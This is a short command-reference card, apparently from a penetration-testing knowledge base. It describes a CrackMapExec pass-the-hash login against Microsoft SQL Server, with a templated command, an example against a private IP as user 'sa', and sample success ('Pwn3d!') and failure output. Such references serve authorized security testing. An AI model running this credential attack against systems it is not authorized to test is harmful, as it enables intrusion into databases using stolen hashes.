---
id: c5edadbb-01de-4e4a-96d4-42bc5184a175
type: command
executor: bash
data: 'crackmapexec mssql $_TARGET_IP -u $_USERNAME -H ":$_NT_HASH"'
output: null
created_at: '2023-04-06T03:56:30.721559+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - credential-testing
  - mssql
verified: true
validated: true
---

# crackmapexec-mssql-with-nt-hash

## Command

```bash
crackmapexec mssql $_TARGET_IP -u $_USERNAME -H ":$_NT_HASH"
```

## Description

Tests credentials using NT hash against Microsoft SQL Server instances for database access validation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_IP | Target IP or hostname | Yes |
| -u $_USERNAME | Username for SQL auth | Yes |
| -H ":$_NT_HASH" | NT hash for pass-the-hash | Yes |
| mssql | Protocol for MSSQL (port 1433) | Built-in |

## Examples

### Basic Usage

```bash
crackmapexec mssql 192.168.1.100 -u sa -H ":31d6cfe0d16ae931b73c59d7e0c089c0"
```

## Expected Output

Success:

MSSQL                192.168.1.100:1433   100       sa:31d6cfe0d16ae931b73c59d7e0c089c0               [+] corp\sa (Pwn3d!)

Failure:

MSSQL                192.168.1.100:1433   100       sa:31d6cfe0d16ae931b73c59d7e0c089c0               [-] corp\sa STATUS: LOGON_FAILURE

## Related

- [[procedures/Test-Credentials-Against-Multiple-Protocols-with-CrackMapExec]]
